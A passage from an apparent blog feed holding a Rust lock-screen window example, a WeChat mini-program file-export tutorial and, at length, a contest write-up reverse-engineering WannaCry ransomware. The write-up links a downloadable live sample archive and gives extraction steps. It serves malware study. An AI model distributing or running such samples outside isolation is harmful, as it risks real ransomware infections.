<p>如果Cargo.toml这样写的话，编译过程中需要环境变量有cmake，如果安装了vs2022的话，直接用everything搜一下cmake，然后配置到环境变量里就行了，然后在cmd中输一下<code>cmake -version</code>，有输出就可以了</p>
<p>如果使用的是vscode来编译rust <code>cargo build</code>，那么看一下终端是不是用的powershell，如果是，则换成cmd，cmake貌似在powershell里没法运行，然后编译即可，时间可能有点长</p>
<p>main.rs示例(创建一个完全覆盖所有显示器的黑色窗口，我用来写了一个锁屏，搭配<a href="https://creeeeeeeeeeper.github.io/2025/05/08/uiaccess/">uiaccess</a>食用)</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="meta">#![windows_subsystem = <span class="string">&quot;windows&quot;</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> fltk::&#123;app, enums::Color, prelude::*, window::Window&#125;;</span><br><span class="line"><span class="keyword">use</span> winit::dpi::PhysicalSize;</span><br><span class="line"><span class="keyword">use</span> winit::monitor::MonitorHandle;</span><br><span class="line"><span class="keyword">use</span> winit::event_loop::EventLoop;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="comment">// 初始化 winit 事件循环</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">event_loop</span> = EventLoop::<span class="title function_ invoke__">new</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Failed to create event loop&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取所有显示器</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">monitors</span>: <span class="type">Vec</span>&lt;MonitorHandle&gt; = event_loop.<span class="title function_ invoke__">available_monitors</span>().<span class="title function_ invoke__">collect</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算所有显示器的总宽度和高度</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">total_width</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">total_height</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> <span class="variable">monitor</span> <span class="keyword">in</span> monitors &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">size</span>: PhysicalSize&lt;<span class="type">u32</span>&gt; = monitor.<span class="title function_ invoke__">size</span>();</span><br><span class="line">        total_width += size.width;</span><br><span class="line">        total_height = total_height.<span class="title function_ invoke__">max</span>(size.height); <span class="comment">// 取最大高度</span></span><br><span class="line">    &#125;</span><br><span class="line">    total_height += <span class="number">500</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 FLTK 应用程序</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">app</span> = app::App::<span class="title function_ invoke__">default</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">win</span> = Window::<span class="title function_ invoke__">default</span>()</span><br><span class="line">        .<span class="title function_ invoke__">with_size</span>(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">        .<span class="title function_ invoke__">with_label</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">with_pos</span>(<span class="number">0</span>, -<span class="number">100</span>); <span class="comment">// 设置窗口位置为屏幕左上角-100</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 显示窗口</span></span><br><span class="line">    win.<span class="title function_ invoke__">end</span>();</span><br><span class="line">    win.<span class="title function_ invoke__">show</span>();</span><br><span class="line">    win.<span class="title function_ invoke__">un_maximize</span>();</span><br><span class="line">    </span><br><span class="line">    win.<span class="title function_ invoke__">set_on_top</span>();</span><br><span class="line">    win.<span class="title function_ invoke__">set_border</span>(<span class="literal">true</span>); <span class="comment">// 移除窗口边框</span></span><br><span class="line">    win.<span class="title function_ invoke__">set_color</span>(Color::<span class="title function_ invoke__">from_rgb</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)); <span class="comment">// 设置窗口背景颜色</span></span><br><span class="line">    </span><br><span class="line">    std::thread::<span class="title function_ invoke__">sleep</span>(std::time::Duration::<span class="title function_ invoke__">from_millis</span>(<span class="number">100</span>)); <span class="comment">// 等待一小段时间</span></span><br><span class="line">    win.<span class="title function_ invoke__">maximize</span>();</span><br><span class="line">    win.<span class="title function_ invoke__">set_size</span>(total_width <span class="keyword">as</span> <span class="type">i32</span>, total_height <span class="keyword">as</span> <span class="type">i32</span>);</span><br><span class="line">    win.<span class="title function_ invoke__">set_pos</span>(<span class="number">0</span>, -<span class="number">100</span>);</span><br><span class="line">    win.<span class="title function_ invoke__">flush</span>();</span><br><span class="line"></span><br><span class="line">    app::<span class="title function_ invoke__">redraw</span>(); <span class="comment">// 强制重绘</span></span><br><span class="line">    app.<span class="title function_ invoke__">run</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>wannacry勒索病毒分析</title>
    <url>/2024/10/02/wannacry/</url>
    <content><![CDATA[<p>分析基于2024龙信杯wcry乐锁病毒题目，<strong>本题目没有原始wannacry病毒的域名开关部分</strong></p>
<span id="more"></span>

<table>
<thead>
<tr>
<th align="center">序号</th>
<th align="center">题目</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">分析计算机检材，eduwcry压缩包文件的解压密码是什么？[标准格式：abcabc] 答案：yasuomima</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">分析计算机检材，接上题，请问恶意程序释放压缩包的md5值是多少。[标准格式：全小写]</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">分析计算机检材，接上题，请问恶意程序记录的洋葱浏览器下载地址是多少？[标准格式：<a href="http://xx.xx/xx/xx.zip]">http://xx.xx/xx/xx.zip]</a></td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">分析计算机检材，接上题，请问恶意程序解密了t.wnry后该dll的md5值是多少。[标准格式：全小写]</td>
</tr>
<tr>
<td align="center">5</td>
<td align="center">分析计算机检材，接上题，恶意程序运行起来后第一个循环调用了几次taskkill.exe。[标准格式：2]</td>
</tr>
<tr>
<td align="center">6</td>
<td align="center">分析计算机检材，接上题，请问@WanaDecryptor@.exe.lnk文件是通过什么函数创建的。[标准格式：Aabcdef]</td>
</tr>
<tr>
<td align="center">7</td>
<td align="center">分析计算机检材，接上题，恶意程序修改系统桌面壁纸是在哪个函数实现的[标准格式：sub_xxx]</td>
</tr>
</tbody></table>
<blockquote>
<p><strong>本文参考：</strong></p>
<p><a href="https://www.youtube.com/watch?v=Sv8yu12y5zM">Reversing WannaCry Part 1 - Finding the killswitch and unpacking the malware in #Ghidra - YouTube</a><br><a href="https://www.youtube.com/watch?v=Q90uZS3taG0">Reversing WannaCry Part 2 - Diving into the malware with #Ghidra - YouTube</a><br><a href="https://sayonara.gitbook.io/writeups/malware-analysis/wannacry-ransomware#extracting-the-wannacry-encryptor-binary">WannaCry 勒索软件 |WriteUps (gitbook.io)</a><br><a href="https://thewebchap.wordpress.com/2017/05/16/wannacry-detailed-analysis-part-2-of-3/">Wannacry ： 详细分析（第 2 部分，共 3 部分） – 网络章节 (wordpress.com)</a><br>[<a href="https://blog.csdn.net/anhui8496/article/details/102431403">病毒分析]WannaCry病毒分析(永恒之蓝)-CSDN博客</a></p>
</blockquote>
<div style="color: red; font-weight: 600;">
    <br>
<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;木马母体为mssecsvc.exe，运行后会扫描随机IP的互联网机器，尝试感染，也会扫描局域网相同网段的机器进行感染传播，此外会释放敲诈者程序tasksche.exe，对磁盘文件进行加密勒索。
    <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;分析时须放到虚拟机里断网操作，关闭共享协议端口或物理隔离，并禁用共享文件夹<br>
<br>
<br>
<br>
<div style="display: flex; justify-content: center">
    <text style="color: red; font-weight: 600;">戈门，别真被乐锁了啊</text>
</div>
<br>
<br>
<br>
<br>
<div style="display: flex; justify-content: center">
    <text style="color: black">两个分析文件下载 ↓</text>
</div>
<br>
<div style="display: flex; justify-content: center">
    <a href="https://creeeeeeeeeeper.github.io/2024/10/02/wannacry/wncy.zip" alt="目录迁移.exe"><div style="display: flex; flex-direction:row; border: solid 1px #cccccc; height: 60px;">
        <image src="https://creeeeeeeeeeper.github.io/2024/10/02/wannacry/image-20241003150917202.png" style="scale: 0.8; margin-top: 10px"></image>
        <div style="display: flex; flex-direction: column; font-size: 12.5px; padding-right: 15px; margin-top: 10px">
            <text>wncy.zip</text>
            <text style="font-size: 8px; color: #cccccc">3.93MB</text>
        </div>
    </div></a></div>
<br>
</div>


<p>下面从第二题开始分析</p>
<h2 id="释放压缩包的md5"><a href="#释放压缩包的md5" class="headerlink" title="释放压缩包的md5"></a>释放压缩包的md5</h2><p>拿出pestudio看一下压缩包里的“下崽”程序wcry.exe，里面有一个PKZIP压缩包</p>
<p><img src="/2024/10/02/wannacry/image-20241002160552864.png" alt="image-20241002160552864"></p>
<p>直接使用pestudio还拿不出来，没法save to file</p>
<p><img src="/2024/10/02/wannacry/image-20241002160743992.png" alt="image-20241002160743992"></p>
<p>使用resource hacker</p>
<p><img src="/2024/10/02/wannacry/image-20241002161028449.png" alt="image-20241002161028449"></p>
<p>右键XIA，将资源保存到BIN文件，保存时，将后缀改成zip</p>
<p><img src="/2024/10/02/wannacry/image-20241002161127998.png" alt="image-20241002161127998"></p>
<p>这样就保存下来了</p>
<img src="/2024/10/02/wannacry/image-20241002161204939.png" alt="image-20241002161204939" style="zoom:50%;">

<img src="/2024/10/02/wannacry/image-20241002161423725.png" alt="image-20241002161423725" style="zoom:50%;">

<p>certutil一下</p>
<blockquote>
<p>b576ada3366908875e5ce4cb3da6153a</p>
</blockquote>
<div>
<br>
<br>
<br>
<br>
</div>

<h2 id="Tor下载地址"><a href="#Tor下载地址" class="headerlink" title="Tor下载地址"></a>Tor下载地址</h2><p>经过一番查看wcry下的崽，找到一个c.wnry，看一下这个文件里面有什么东西</p>
<p><img src="/2024/10/02/wannacry/image-20241002171753970.png" alt="image-20241002171753970"></p>
<p>发现里面放了程序中虚拟币的地址<img src="/2024/10/02/wannacry/image-20241002171819869.png" alt="image-20241002171819869" style="zoom:50%;"></p>
<p>还有一些以<code>.onion</code>结尾的东西，应该就跟Tor有关，还有最后一个链接<code>https://dist.torproject.org/torbrowser/6.5.1/tor-win32-0.2.9.10.zip</code></p>
<p>这个就应该是Tor的下载地址</p>
<blockquote>
<p><code>https://dist.torproject.org/torbrowser/6.5.1/tor-win32-0.2.9.10.zip</code></p>
</blockquote>
<div>
<br>
<br>
</div>


<h2 id="解密了t-wnry后该dll的md5值是多少"><a href="#解密了t-wnry后该dll的md5值是多少" class="headerlink" title="解密了t.wnry后该dll的md5值是多少"></a>解密了t.wnry后该dll的md5值是多少</h2><p>在虚拟机中分析的时候不要运行病毒，真服了，闲的没事儿就把我IDA的key和license加密了</p>
<p>首先对WinMain分析一下：</p>
<p><img src="/2024/10/02/wannacry/image-20241003103342937.png" alt="image-20241003103342937"></p>
<p>大体知道第一个wcry.exe怎么运行就好了，先不分析每个函数，用x32动态把dll拿出来</p>
<p><img src="/2024/10/02/wannacry/image-20241003120451211.png" alt="image-20241003120451211"><br><img src="/2024/10/02/wannacry/image-20241003120539642.png" alt="image-20241003120539642"></p>
<p>在上面这个函数中，判断完主要功能之后，要在内存中找到这块PE文件，直接在最后的<code>return v4</code>的地方按一下Tab，界面落在了<code>mov eax, ebx</code>的位置，所以这个函数返回的时候就是用的eax寄存器，使用x32跑到这里然后转到eax存的那个地址应该就是那个隐藏的dll文件了。</p>
<p><img src="/2024/10/02/wannacry/image-20241003120719251.png" alt="image-20241003120719251"></p>
<p><img src="/2024/10/02/wannacry/image-20241003120902189.png" alt="image-20241003120902189"></p>
<p>EAX是<code>00A83DE8</code>，在内存中转到，终于发现了这个MZ头</p>
<p><img src="/2024/10/02/wannacry/image-20241003121001396.png" alt="image-20241003121001396"></p>
<p>将这一大块属于这个dll的保存到文件</p>
<p><img src="/2024/10/02/wannacry/image-20241003121317994.png" alt="image-20241003121317994"></p>
<p>看看恁俩这个大小长得真像啊，就差0.2KB</p>
<img src="/2024/10/02/wannacry/image-20241003121712803.png" alt="image-20241003121712803" style="zoom:67%;">

<p><img src="/2024/10/02/wannacry/image-20241003121848526.png" alt="image-20241003121848526"></p>
<p>所以t.wnry解密后dll的md5应该是</p>
<blockquote>
<p>f351e1fcca0c4ea05fc44d15a17f8b36</p>
</blockquote>
<h2 id="第一个循环调用了几次taskkill-exe"><a href="#第一个循环调用了几次taskkill-exe" class="headerlink" title="第一个循环调用了几次taskkill.exe"></a>第一个循环调用了几次taskkill.exe</h2><p>wcry.exe中：</p>
<p><img src="/2024/10/02/wannacry/image-20241003123201124.png" alt="image-20241003123201124"></p>
<p>下面开始对dll中的TaskStart函数开始分析</p>
<p>将分出来的dll再扔到IDA中，找到TastStart函数</p>
<p><img src="/2024/10/02/wannacry/image-20241003123256110.png" alt="image-20241003123256110"></p>
<p>首先对着TaskStart一顿分析：</p>
<p><img src="/2024/10/02/wannacry/20241003131128.png" alt="20241003131128"><br><img src="/2024/10/02/wannacry/20241003131242.png" alt="20241003131242"><br><img src="/2024/10/02/wannacry/20241003131341.png" alt="20241003131341"></p>
<p>这一堆没有发现什么taskkill</p>
<p>最后那个函数里面还有好多东西，我标了一个Important，进来看看</p>
<p><img src="/2024/10/02/wannacry/20241003131901.png" alt="20241003131901"><br><img src="/2024/10/02/wannacry/20241003131943.png" alt="20241003131943"></p>
<p>到这里就不用往下看了，已经发现了Taskkill，Tab切换到代码视图</p>
<p><img src="/2024/10/02/wannacry/image-20241003132059380.png" alt="image-20241003132059380"></p>
<p>所以应该调用了5次taskkill.exe，不过我不是很懂题目中说的第一个循环是什么意思</p>
<p>不过……后来才发现，好像直接搜字符串也行</p>
<p><img src="/2024/10/02/wannacry/image-20241003133919573.png" alt="image-20241003133919573"></p>
<h2 id="WanaDecryptor-exe-lnk文件是通过什么函数创建"><a href="#WanaDecryptor-exe-lnk文件是通过什么函数创建" class="headerlink" title="@WanaDecryptor@.exe.lnk文件是通过什么函数创建"></a>@WanaDecryptor@.exe.lnk文件是通过什么函数创建</h2><p>首先要找到<code>@WanaDecryptor@.exe.lnk</code>这个东西</p>
<p>从上题的taskkill往下找，稍微翻一下就翻到了这个字符串所在的位置（也可以直接搜）：</p>
<p><img src="/2024/10/02/wannacry/image-20241003133128344.png" alt="image-20241003133128344"></p>
<p><img src="/2024/10/02/wannacry/image-20241003134435554.png" alt="image-20241003134435554"></p>
<p>不过这里的逻辑好像是跳过这三个文件，对其他的所有（他要加密）的后缀进行加密，所以这三个文件应该在之前就创建了，所以再往前找</p>
<p>由于对批处理脚本不熟悉，所以分析完上面的一堆函数才来分析这个批处理脚本</p>
<p>也不会这玩意，问一下ai</p>
<img src="/2024/10/02/wannacry/image-20241003135834048.png" alt="image-20241003135834048" style="zoom:63%;">

<img src="/2024/10/02/wannacry/image-20241003135942848.png" alt="image-20241003135942848" style="zoom:50%;">

<p>嗯……我觉得AI说得对！那就应该是CreateShortcut函数</p>
<h2 id="修改系统桌面壁纸是在哪个函数实现的"><a href="#修改系统桌面壁纸是在哪个函数实现的" class="headerlink" title="修改系统桌面壁纸是在哪个函数实现的"></a>修改系统桌面壁纸是在哪个函数实现的</h2><p>嗯，也不会，问问AI</p>
<p><img src="/2024/10/02/wannacry/image-20241003141310913.png" alt="image-20241003141310913"></p>
<p><img src="/2024/10/02/wannacry/image-20241003141356282.png" alt="image-20241003141356282"></p>
<p>不一会儿就翻出来了</p>
<p><img src="/2024/10/02/wannacry/image-20241003144903325.png" alt="image-20241003144903325"></p>
<p>答案让回答sub_xxxxx</p>
<blockquote>
<p>sub_10004F20</p>
</blockquote>
<div>
    <br>
答案都是自己做的，做了将近两天，已经头昏眼花了，不一定对，如有不对请大大大大大大佬指教一下
    <br>
</div>
]]></content>
  </entry>
  <entry>
    <title>websocket chat</title>
    <url>/2025/03/23/wschat/</url>
    <content><![CDATA[<p>记录一个使用websocket的聊天室</p>
<p>WebSocket服务器使用的是nodejs (因为不会php)</p>
<p>只实现了一个广播消息的功能可以发送文字消息、文件(&lt;100MB)、图片，传输的消息没有经过加密</p>
<p>有简单的登录和注册功能</p>
<p>点击<a href="https://creeeeeeeeeeper.github.io/2025/03/23/wschat/wsChat.7z.001" alt="wsChat.7z.001">此处</a>下载代码01</p>
<p>点击<a href="https://creeeeeeeeeeper.github.io/2025/03/23/wschat/wsChat.7z.002">此处</a>下载代码02</p>
<p>点击<a href="https://creeeeeeeeeeper.github.io/2025/03/23/wschat/wsChat.7z.003">此处</a>下载代码03</p>
<p>点击<a href="https://creeeeeeeeeeper.github.io/2025/03/23/wschat/wsChat.7z.004">此处</a>下载代码04</p>
<p>点击<a href="https://creeeeeeeeeeper.github.io/2025/03/23/wschat/wsChat.7z.005">此处</a>下载代码05</p>
<p>点击<a href="https://creeeeeeeeeeper.github.io/2025/03/23/wschat/wsChat.7z.006">此处</a>下载代码06</p>
<p>分卷的六个小压缩包</p>
]]></content>
  </entry>
  <entry>
    <title>微信小程序保存文件到本地</title>
    <url>/2025/10/09/wxxcx-saveFile/</url>
    <content><![CDATA[<p>微信小程序导出文件到本地，或直接分享到会话</p>
<span id="more"></span>

<p>首先有这样一个自己写的云函数，可以生成Excel，然后返回一个下载链接</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">wx.<span class="property">cloud</span>.<span class="title function_">callFunction</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;exportExcel&quot;</span>,</span><br><span class="line">    <span class="attr">data</span>: &#123;</span><br><span class="line">        <span class="attr">startTime</span>:<span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">starttime</span>,</span><br><span class="line">        <span class="attr">endTime</span>:<span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">endtime</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>后面写一个then</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">wx.<span class="property">cloud</span>.<span class="title function_">callFunction</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;exportExcel&quot;</span>, </span><br><span class="line">    <span class="attr">data</span>: &#123;</span><br><span class="line">        <span class="attr">startTime</span>:<span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">starttime</span>,</span><br><span class="line">        <span class="attr">endTime</span>:<span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">endtime</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    concole.<span class="title function_">log</span>(<span class="string">&#x27;云函数返回结果&#x27;</span> + res)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p><img src="/2025/10/09/wxxcx-saveFile/image-20251009150612064.png" alt="image-20251009150612064"></p>
<p>返回结果如上</p>
<p>在then中的<code>res.result.fileID</code>就是文件在云存储中的fileID，如果用的不是微信的云存储那么不需要这一步，直接下载文件然后保存到临时路径即可（这个这里不讲，只讲使用微信云存储的情况）</p>
<p>然后有了这个fileID之后，使用<code>wx.cloud.downloadFile</code>直接下载这个文件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">wx.<span class="property">cloud</span>.<span class="title function_">downloadFile</span>(&#123;</span><br><span class="line">    <span class="attr">fileID</span>: fileID <span class="comment">// 文件ID</span></span><br><span class="line">    <span class="attr">success</span>: <span class="function"><span class="params">downloadRes</span> =&gt;</span> &#123;</span><br><span class="line">    	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;下载成功，临时文件路径：&#x27;</span>, downloadRes.<span class="property">tempFilePath</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>在手机上，保存的文件会生成一个随机文件名，格式为<code>storage_abcdefg123456.xxx</code></p>
<img src="/2025/10/09/wxxcx-saveFile/image-20251009152220690.png" alt="image-20251009152220690" style="zoom:50%;">

<p>这样会导致保存的文件不是原文件名，那么就先从fileID中提取文件名</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> fileName = <span class="string">&#x27;违纪信息.xlsx&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (fileID.<span class="title function_">includes</span>(<span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">const</span> extracted = fileID.<span class="title function_">split</span>(<span class="string">&#x27;/&#x27;</span>).<span class="title function_">pop</span>();</span><br><span class="line">    <span class="keyword">if</span> (extracted) &#123;</span><br><span class="line">        fileName = <span class="built_in">decodeURIComponent</span>(extracted);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后使用文件系统管理器复制文件到指定路径</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fileManager = wx.<span class="title function_">getFileSystemManager</span>();</span><br><span class="line"><span class="keyword">const</span> destPath = <span class="string">`<span class="subst">$&#123;wx.env.USER_DATA_PATH&#125;</span>/<span class="subst">$&#123;fileName&#125;</span>`</span>; <span class="comment">// 注意这里使用的是wx.env.USER_DATA_PATH</span></span><br><span class="line"></span><br><span class="line">fileManager.<span class="title function_">copyFile</span>(&#123;</span><br><span class="line">    <span class="attr">srcPath</span>: downloadRes.<span class="property">tempFilePath</span>,</span><br><span class="line">    <span class="attr">destPath</span>: destPath,</span><br><span class="line">    <span class="attr">success</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;复制文件成功，文件路径:&#x27;</span>, destPath);</span><br><span class="line">        wx.<span class="title function_">hideLoading</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 打开文档，支持分享</span></span><br><span class="line">        wx.<span class="title function_">openDocument</span>(&#123;</span><br><span class="line">            <span class="attr">filePath</span>: destPath,</span><br><span class="line">            <span class="attr">fileType</span>: <span class="string">&#x27;xlsx&#x27;</span>,</span><br><span class="line">            <span class="attr">showMenu</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;打开文档成功&#x27;</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">fail</span>: <span class="keyword">function</span> (<span class="params">err</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;打开文档失败:&#x27;</span>, err);</span><br><span class="line">                wx.<span class="title function_">showToast</span>(&#123;</span><br><span class="line">                    <span class="attr">title</span>: <span class="string">&#x27;打开文件失败&#x27;</span>,</span><br><span class="line">                    <span class="attr">icon</span>: <span class="string">&#x27;none&#x27;</span></span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">fail</span>: <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;保存文件失败:&#x27;</span>, err);</span><br><span class="line">        wx.<span class="title function_">hideLoading</span>();</span><br><span class="line">        wx.<span class="title function_">showToast</span>(&#123;</span><br><span class="line">            <span class="attr">title</span>: <span class="string">&#x27;保存文件失败&#x27;</span>,</span><br><span class="line">            <span class="attr">icon</span>: <span class="string">&#x27;none&#x27;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>然后，下载成功后就会直接打开这个文件，电脑上会直接打开Excel，手机上则会提示使用指定的程序打开预览，并且文件名也会显示正确</p>
<p><img src="/2025/10/09/wxxcx-saveFile/image-20251009152558338.png" alt="image-20251009152558338" style="zoom:50%;">             <img src="/2025/10/09/wxxcx-saveFile/image-20251009152659261.png" alt="image-20251009152659261" style="zoom:50%;">  </p>
<p>完整代码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Daochu</span>()&#123;</span><br><span class="line">    wx.<span class="title function_">showLoading</span>(&#123;</span><br><span class="line">        <span class="attr">title</span>: <span class="string">&#x27;下载中&#x27;</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    wx.<span class="property">cloud</span>.<span class="title function_">callFunction</span>(&#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;exportExcel&quot;</span>, <span class="comment">// 生成Excel的云函数</span></span><br><span class="line">        <span class="attr">data</span>: &#123;</span><br><span class="line">            <span class="attr">startTime</span>:<span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">starttime</span>,</span><br><span class="line">            <span class="attr">endTime</span>:<span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">endtime</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;云函数返回结果:&#x27;</span>, res);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;文件ID类型:&#x27;</span>, <span class="keyword">typeof</span> res.<span class="property">result</span>, <span class="string">&#x27;内容:&#x27;</span>, res.<span class="property">result</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取文件ID（可能在不同字段中，看自己的在什么地方）</span></span><br><span class="line">        <span class="keyword">let</span> fileID = res.<span class="property">result</span>.<span class="property">fileID</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 直接下载云存储文件</span></span><br><span class="line">        wx.<span class="property">cloud</span>.<span class="title function_">downloadFile</span>(&#123;</span><br><span class="line">            <span class="attr">fileID</span>: fileID, <span class="comment">// 文件 ID</span></span><br><span class="line">            <span class="attr">success</span>: <span class="function"><span class="params">downloadRes</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;下载成功，临时文件路径:&#x27;</span>, downloadRes.<span class="property">tempFilePath</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 从 fileID 中提取文件名</span></span><br><span class="line">                <span class="keyword">let</span> fileName = <span class="string">&#x27;xxxxxxxx.xlsx&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span> (fileID.<span class="title function_">includes</span>(<span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">const</span> extracted = fileID.<span class="title function_">split</span>(<span class="string">&#x27;/&#x27;</span>).<span class="title function_">pop</span>();</span><br><span class="line">                    <span class="keyword">if</span> (extracted) &#123;</span><br><span class="line">                        fileName = <span class="built_in">decodeURIComponent</span>(extracted);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 使用文件系统管理器复制文件到指定路径</span></span><br><span class="line">                <span class="keyword">const</span> fileManager = wx.<span class="title function_">getFileSystemManager</span>();</span><br><span class="line">                <span class="keyword">const</span> destPath = <span class="string">`<span class="subst">$&#123;wx.env.USER_DATA_PATH&#125;</span>/<span class="subst">$&#123;fileName&#125;</span>`</span>;</span><br><span class="line"></span><br><span class="line">                fileManager.<span class="title function_">copyFile</span>(&#123;</span><br><span class="line">                    <span class="attr">srcPath</span>: downloadRes.<span class="property">tempFilePath</span>,</span><br><span class="line">                    <span class="attr">destPath</span>: destPath,</span><br><span class="line">                    <span class="attr">success</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;复制文件成功，文件路径:&#x27;</span>, destPath);</span><br><span class="line">                        wx.<span class="title function_">hideLoading</span>();</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 打开文档，支持分享</span></span><br><span class="line">                        wx.<span class="title function_">openDocument</span>(&#123;</span><br><span class="line">                            <span class="attr">filePath</span>: destPath,</span><br><span class="line">                            <span class="attr">fileType</span>: <span class="string">&#x27;xlsx&#x27;</span>, <span class="comment">// 这里我导出的是Excel，需要PDF的话需要改一下</span></span><br><span class="line">                            <span class="attr">showMenu</span>: <span class="literal">true</span>,</span><br><span class="line">                            <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;打开文档成功&#x27;</span>);</span><br><span class="line">                            &#125;,</span><br><span class="line">                            <span class="attr">fail</span>: <span class="keyword">function</span> (<span class="params">err</span>) &#123;</span><br><span class="line">                                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;打开文档失败:&#x27;</span>, err);</span><br><span class="line">                                wx.<span class="title function_">showToast</span>(&#123;</span><br><span class="line">                                    <span class="attr">title</span>: <span class="string">&#x27;打开文件失败&#x27;</span>,</span><br><span class="line">                                    <span class="attr">icon</span>: <span class="string">&#x27;none&#x27;</span></span><br><span class="line">                                &#125;);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;);</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="attr">fail</span>: <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;保存文件失败:&#x27;</span>, err);</span><br><span class="line">                        wx.<span class="title 